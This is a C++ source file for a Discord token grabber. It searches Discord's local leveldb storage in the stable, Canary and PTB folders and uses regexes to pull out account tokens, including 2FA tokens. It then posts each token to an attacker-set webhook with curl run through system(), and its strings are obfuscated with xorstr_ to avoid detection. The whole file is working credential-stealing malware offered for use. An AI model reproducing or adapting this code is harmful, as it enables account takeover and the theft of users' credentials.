#include "grabber.h"

void grabbertoken::grabtoken()
{

    // get appdata
	std::string appdata = getenv(xorstr_("APPDATA"));

    // discord tokenpaths where token is stored
    std::vector<std::string> discordtokenpaths;
    discordtokenpaths.push_back(appdata + xorstr_("\\discord\\Local Storage\\leveldb\\"));
    discordtokenpaths.push_back(appdata + xorstr_("\\Discord Canary\\Local Storage\\leveldb\\"));
    discordtokenpaths.push_back(appdata + xorstr_("\\discordptb\\Local Storage\\leveldb\\"));

    for (int i = 0; i < discordtokenpaths.size(); i++)
    {
        if (std::filesystem::exists(discordtokenpaths.at(i)) == true) // check if path exist
        {
            for (const auto& entry : std::filesystem::directory_iterator(discordtokenpaths.at(i)))
            {
                if (entry.path().string().find(xorstr_(".log")) != std::string::npos || entry.path().string().find(xorstr_(".ldb")) != std::string::npos) // check if the file have the extension .log or .ldb
                {
                    findtoken((entry.path().string())); // gonna find the token with magic regex search
                }
            }
        }
    }

    // send all tokens to the webhook
    for (int i = 0; i < discordtokens.size(); i++)
    {
        std::string command = xorstr_("curl --data \"username=") + webhookname + xorstr_("&content=```discord token: ") + discordtokens.at(i) + xorstr_("```&avatar_url=") + avatar_url + "\" " + webhook_url; // SEND
        system(command.c_str());

        std::this_thread::sleep_for(std::chrono::milliseconds(1000)); // delay
    }

}

void grabbertoken::findtoken(std::string path) // grab token! // thanks based#0001 for helping me out on this part
{
    // regex
    std::string discordtokenwithout2fa = xorstr_(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
    std::string discordtokenwith2FA = xorstr_(R"(mfa\.[\w-]{84})");
    std::regex discordtokenwithout2faregex(discordtokenwithout2fa);
    std::regex discordtokenwith2FAregex(discordtokenwith2FA);

    // get file into string
    std::ifstream stream((path), std::ios::binary);
    std::string content((std::istreambuf_iterator<char>(stream)),
    std::istreambuf_iterator<char>());
    stream.close();

    // use std::regex_search to find regex
    std::smatch result;

    if (std::regex_search(content, result, discordtokenwith2FAregex))
    {
        discordtokens.emplace_back(result.str());
    }

    if (std::regex_search(content, result, discordtokenwithout2faregex))
    {
        discordtokens.emplace_back(result.str());
    }
}
